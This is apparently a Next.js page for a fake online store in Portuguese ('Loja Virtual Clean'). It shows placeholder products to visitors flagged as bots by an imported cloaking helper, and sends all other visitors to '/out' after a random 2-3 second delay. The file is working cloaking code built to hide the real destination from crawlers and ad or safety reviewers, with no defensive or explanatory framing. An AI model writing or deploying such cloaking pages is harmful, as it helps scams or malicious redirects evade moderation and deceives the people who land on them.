
import { useEffect } from 'react'
import { isBot } from '../utils/cloak'
import { useRouter } from 'next/router'

export default function Home() {
  const router = useRouter()

  useEffect(() => {
    if (!isBot()) {
      const delay = Math.floor(Math.random() * 1000) + 2000 // 2-3s delay
      setTimeout(() => {
        router.push('/out')
      }, delay)
    }
  }, [])

  return (
    <div style={{ padding: '2rem', fontFamily: 'sans-serif' }}>
      <h1>Loja Virtual Clean</h1>
      <p>Confira nossas ofertas em eletrônicos, casa e mais.</p>
      <div style={{ display: 'flex', gap: '2rem', marginTop: '2rem' }}>
        <div>
          <img src="https://via.placeholder.com/150" alt="Produto 1" />
          <p>Produto 1</p>
        </div>
        <div>
          <img src="https://via.placeholder.com/150" alt="Produto 2" />
          <p>Produto 2</p>
        </div>
      </div>
    </div>
  )
}
